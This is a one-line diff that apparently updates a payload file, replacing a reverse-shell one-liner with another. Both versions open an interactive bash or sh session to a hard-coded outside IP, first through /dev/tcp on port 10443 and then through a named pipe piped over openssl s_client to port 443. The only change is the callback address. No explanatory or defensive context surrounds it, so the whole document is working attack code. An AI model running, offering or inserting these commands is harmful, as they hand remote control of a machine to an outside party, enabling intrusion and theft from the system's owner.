@@ -1,1 +1,1 @@
-/usr/bin/bash -i >& /dev/tcp/45.121.50.235/10443 0>&1;/usr/bin/mkfifo /tmp/s; /usr/bin/bash -i < /tmp/s 2>&1 | /usr/bin/openssl s_client -quiet -connect 45.121.50.235:443 > /tmp/s; /usr/bin/rm /tmp/s
+bash -i >& /dev/tcp/118.193.62.151/10443 0>&1;mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 118.193.62.151:443 > /tmp/s; rm /tmp/s
